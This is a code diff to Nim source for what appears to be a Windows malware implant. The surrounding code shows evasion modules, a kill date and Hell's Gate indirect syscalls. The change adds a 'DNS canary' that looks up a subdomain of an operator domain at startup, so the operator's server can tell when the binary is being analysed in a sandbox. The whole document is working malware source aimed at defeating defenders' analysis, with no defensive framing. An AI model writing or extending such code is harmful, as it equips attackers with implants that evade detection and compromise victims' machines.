@@ -9,6 +9,18 @@ import std/[os, times, strutils, random]
 import winim/lean
 import config, transport, commands, evasion, syscalls
 
+# DNS canary: fire-and-forget A lookup so the server detects sandbox analysis.
+# Only compiled in when a CanaryDomain is baked in at build time.
+when CanaryDomain != "":
+  var canaryWsaBuf: array[408, byte]
+  proc canaryWsaStartup(v: uint16; d: pointer): int32
+    {.stdcall, dynlib: "ws2_32", importc: "WSAStartup".}
+  proc canaryGethostbyname(n: cstring): pointer
+    {.stdcall, dynlib: "ws2_32", importc: "gethostbyname".}
+  proc canaryDnsLookup() =
+    discard canaryWsaStartup(0x0202, addr canaryWsaBuf[0])
+    discard canaryGethostbyname(cstring("canary." & CanaryDomain))
+
 proc killDateCheck() =
   when KillDate != "":
     try:
@@ -29,6 +41,11 @@ proc main() =
 
   # Indirect syscall stubs (Hell's Gate SSN resolution)
   initSyscalls()
+
+  # Canary DNS lookup — triggers server-side burn detection if this binary is
+  # sandbox-analyzed before it registers. Fire-and-forget; result is irrelevant.
+  when CanaryDomain != "":
+    canaryDnsLookup()
 
   # Init transport
   var t = newTransport()
